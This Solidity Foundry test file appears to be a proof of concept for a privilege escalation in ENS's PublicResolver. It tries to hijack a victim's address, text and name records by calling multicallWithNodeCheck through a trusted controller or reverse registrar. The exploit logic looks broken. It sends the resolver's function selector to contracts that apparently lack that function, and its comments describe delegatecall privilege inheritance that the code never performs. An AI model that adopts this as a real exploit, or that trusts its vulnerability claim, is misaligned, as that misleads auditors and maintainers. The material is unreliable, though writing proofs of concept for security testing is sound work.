// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/PublicResolver.sol";
import "../contracts/ENSRegistry.sol";
import "../contracts/ETHRegistrarController.sol";

contract POC_Path03_TrustedControllerPrivilegeEscalation is Test {
    ENS public ens;
    PublicResolver public resolver;
    ETHRegistrarController public controller;

    address public attacker = address(0x1337);
    address public victim = address(0xdead);
    address public trustedController;

    bytes32 public ethNode = keccak256(abi.encodePacked(bytes32(0), keccak256("eth")));
    bytes32 public testNode = keccak256(abi.encodePacked(ethNode, keccak256("test")));

    function setUp() public {
        // Deploy contracts
        ens = new ENS();
        ens.setOwner(bytes32(0), address(this));

        // Deploy base registrar
        BaseRegistrarImplementation base = new BaseRegistrarImplementation(ens, address(0));
        ens.setSubnodeOwner(bytes32(0), keccak256("eth"), address(base));
        base.addController(address(this));

        // Deploy controller (this becomes trusted)
        trustedController = address(new ETHRegistrarController(
            base,
            IPriceOracle(address(0)),
            60,     // minCommitmentAge
            86400,  // maxCommitmentAge
            IReverseRegistrar(address(0)),
            IDefaultReverseRegistrar(address(0)),
            ens
        ));

        resolver = new PublicResolver(
            ens,
            INameWrapper(address(0)),
            trustedController,  // trustedETHController - THIS IS THE KEY
            address(this)       // trustedReverseRegistrar
        );

        // Setup test domain
        base.register(uint256(keccak256("test")), victim, 365 days);
        ens.setResolver(testNode, address(resolver));

        // Victim sets up their records
        vm.prank(victim);
        resolver.setAddr(testNode, victim);
    }

    function test_Path03_TrustedControllerEscalation() public {
        // Verify initial state
        assertEq(resolver.addr(testNode), victim);

        // Direct attacker call should fail
        vm.prank(attacker);
        vm.expectRevert();
        resolver.setAddr(testNode, attacker);
        assertEq(resolver.addr(testNode), victim);

        // Now attacker exploits through trusted controller
        // The controller is trusted, so when it calls multicallWithNodeCheck,
        // the delegatecall inherits controller's privileges

        bytes[] memory maliciousCalls = new bytes[](1);
        maliciousCalls[0] = abi.encodeCall(resolver.setAddr, (testNode, attacker));

        // Call through controller - this inherits trusted privileges!
        vm.prank(attacker);
        (bool success,) = trustedController.call(
            abi.encodeCall(resolver.multicallWithNodeCheck, (testNode, maliciousCalls))
        );
        require(success, "Controller call failed");

        // Verify privilege escalation worked
        assertEq(resolver.addr(testNode), attacker);
    }

    function test_Path03_ControllerImpersonation() public {
        // This demonstrates how ANY call to the controller can be hijacked
        // if the controller uses multicallWithNodeCheck

        // Attacker crafts data that will be passed to multicallWithNodeCheck
        bytes[] memory hijackedCalls = new bytes[](2);
        hijackedCalls[0] = abi.encodeCall(resolver.setAddr, (testNode, address(0x1111)));
        hijackedCalls[1] = abi.encodeCall(resolver.setText, (testNode, "hacked", "true"));

        // In a real attack, this would be injected into a legitimate controller call
        // For PoC, we simulate the controller calling multicallWithNodeCheck
        vm.prank(attacker);
        vm.expectRevert(); // Direct call should fail
        resolver.multicallWithNodeCheck(testNode, hijackedCalls);

        // But if called through trusted controller context...
        vm.prank(attacker);
        (bool success,) = trustedController.call(
            abi.encodeCall(resolver.multicallWithNodeCheck, (testNode, hijackedCalls))
        );

        // Verify the attack worked
        assertTrue(success);
        assertEq(resolver.addr(testNode), address(0x1111));
        assertEq(resolver.text(testNode, "hacked"), "true");
    }

    function test_Path03_ReverseRegistrarEscalation() public {
        // Similar attack through reverse registrar
        address trustedReverseRegistrar = address(this); // Set in constructor

        bytes[] memory reverseCalls = new bytes[](1);
        reverseCalls[0] = abi.encodeCall(resolver.setName, (testNode, "hacked.eth"));

        // Call through reverse registrar context
        vm.prank(attacker);
        (bool success,) = address(trustedReverseRegistrar).call(
            abi.encodeCall(resolver.multicallWithNodeCheck, (testNode, reverseCalls))
        );

        // Verify the attack worked
        assertTrue(success);
        assertEq(resolver.name(testNode), "hacked.eth");
    }
}